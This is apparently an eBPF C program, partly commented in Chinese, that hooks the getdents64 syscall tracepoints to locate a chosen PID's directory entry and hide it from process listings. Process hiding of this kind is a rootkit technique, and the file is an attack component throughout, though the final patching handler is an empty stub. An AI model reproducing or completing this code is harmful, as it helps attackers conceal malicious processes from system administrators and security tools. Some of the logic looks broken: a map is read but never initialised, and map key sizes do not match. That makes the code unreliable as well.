#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_core_read.h>
#include "common.h"

char LICENSE[] SEC("license") = "GPL";

//全局变量区
volatile int target_ppid = 0;

//宏定义
#define MAX_PID_LEN 10
const volatile int pid_to_hide_len = 0;
const volatile char pid_to_hide[MAX_PID_LEN] = {0};

// 映射表 存储dents 缓冲区的地址
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, u32);
    __type(value, u64);
} map_buffs SEC(".maps");

// 映射表，用于循环搜索数据
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, u32);
    __type(value, u32);
} map_bytes_read SEC(".maps");

// 映射表，存储程序的尾调用的
struct {
    __uint(type, BPF_MAP_TYPE_PROG_ARRAY);
    __uint(max_entries, 5);
    __type(key, u32);
    __type(value, u32);
}map_prog_array SEC(".maps");


//映射表，存储实际的地址
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, u32);
    __type(value, u64);
} map_to_patch SEC(".maps");

// RingBuffer to send events to user space
struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 256 * 1024); // 256KB 的缓冲区
} rb SEC(".maps");

//定义tracepoint处理函数
// 函数原型：int getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
SEC("tracepoint/syscalls/sys_enter_getdents64")
int handle_getdents_enter(struct trace_event_raw_sys_enter *ctx) {
    size_t pid_tgid = bpf_get_current_pid_tgid();
    if(target_ppid != 0) {
        //检查是否是目标进程的子进程
        struct task_struct* task = (struct task_struct*)bpf_get_current_task();
        int ppid = BPF_CORE_READ(task, real_parent, tgid);
        if(ppid != target_ppid) {
            return 0;
        }
    }

    int pid = pid_tgid >> 32;
    unsigned int fd = ctx->args[0];
    unsigned int buff_count = ctx->args[2];
    bpf_printk("getdents64 called with pid: %d, fd: %d, buff_count: %d\n", pid, fd, buff_count);

    // 将参数存储到map中,供退出函数使用
    struct linux_dirent64 *dirp = (struct linux_dirent64 *)ctx->args[1];

    // 将缓冲区地址存储到map中
    bpf_map_update_elem(&map_buffs, &pid_tgid, &dirp, BPF_ANY);
    
    return 0;
}

SEC("tracepoint/syscalls/sys_exit_getdents64")
int handle_getdents_exit(struct trace_event_raw_sys_exit *ctx) {
    size_t pid_tgid = bpf_get_current_pid_tgid();
    int total_bytes_read = ctx->ret;
    //if total_bytes_read is 0, everything is been read, then return
    if(total_bytes_read <= 0) {
        return 0;
    }

    // 从map中获取缓冲区地址
    long unsigned int *pbuff_addr = bpf_map_lookup_elem(&map_buffs, &pid_tgid);
    if(!pbuff_addr) {
        bpf_printk("buff_addr is NULL\n");
        return 0;
    }

    // All of this is quite complex, but basically boils down to calling 'handle_getdents_exit' in a loop
    // to iterate over the file listing in chunks of 200,and seeing if a folder with the name of our pid is in there.
    // if we find it, use 'bpf_tail_call' to jump to handle_getdents_patch to do the actual patching.
    long unsigned int buff_addr = *pbuff_addr;
    struct linux_dirent64 *dirp = 0;
    int pid = pid_tgid >> 32;
    short unsigned int d_reclen = 0;
    char filename[MAX_PID_LEN];
    
    unsigned int bpos = 0;
    unsigned int *pBPOS = bpf_map_lookup_elem(&map_bytes_read, &pid_tgid);
    if(!pBPOS) {
        bpf_printk("error:pBPOS is NULL\n");
        return 0;
    }

    bpos = *pBPOS;

    //循环200次来读取数据
    for (int i = 0; i < 200; i++) {
        if(bpos >= total_bytes_read) {
            break;
        }

        // 读取数据
        dirp = (struct linux_dirent64 *)(buff_addr + bpos);
        bpf_probe_read_user(&d_reclen, sizeof(d_reclen), &dirp->d_reclen);
        //TODO:MAX_FILENAME_LEN need passed from userspace,not finished
        bpf_probe_read_user_str(filename, MAX_PID_LEN, &dirp->d_name);

        // 检查是否需要隐藏
        int j = 0;
        for(j = 0; j < pid_to_hide_len; j++) {
            if(filename[j] != pid_to_hide[j]) {
                break;
            }
        }
        
        if(j == pid_to_hide_len){
            //We have found the folder,jump to handle_getdents_patch so we can remove it!
            bpf_map_delete_elem(&map_buffs, &pid_tgid);
            bpf_map_delete_elem(&map_bytes_read, &pid_tgid);
            bpf_tail_call(ctx, &map_prog_array, PROG_02);
        }
        bpf_map_update_elem(&map_to_patch, &pid_tgid, &dirp, BPF_ANY);
        bpos += d_reclen;
    }

    //if we didn't find it, but there's still more to read,
    //jump back the start of this function and keep looking
    if(bpos < total_bytes_read) {
        bpf_map_update_elem(&map_bytes_read, &pid_tgid, &bpos, BPF_ANY);
        bpf_tail_call(ctx, &map_prog_array, PROG_01);
    }

    //delete the element of map
    bpf_map_delete_elem(&map_bytes_read, &pid_tgid);
    bpf_map_delete_elem(&map_buffs, &pid_tgid);
    return 0;
}

SEC("tracepoint/syscalls/sys_exit_getdents64")
int handle_getdents_patch(struct trace_event_raw_sys_exit *ctx) {
    return 0;
}






